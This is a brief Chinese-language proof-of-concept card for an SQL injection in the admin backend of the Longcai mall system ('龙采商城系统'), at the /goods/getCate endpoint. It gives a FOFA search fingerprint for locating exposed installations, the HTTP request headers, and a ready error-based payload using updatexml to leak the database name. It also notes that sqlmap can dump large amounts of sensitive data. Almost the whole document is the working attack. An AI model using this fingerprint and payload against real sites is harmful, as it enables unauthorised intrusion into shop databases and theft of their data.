# 龙采商城系统后台_goods_getcate存在SQL注入

- **系统**：龙采商城系统后台_goods_getcate　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`FOFA：body="'url':'/pc2.0/index/index'"`
- **请求**：`POST /goods/getCate HTTP/2`
- **关键头**：`Host: xxx`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 65`

**请求体 / payload**
```
id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&keyword=
使用burp请求POC即可暴出敏感数据库（也可以采用sqlmap跑出大量敏感信息）
>
```

**其他**
- 龙采商城系统后台/goods/getcate存在SQL注入: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: 龙采商城系统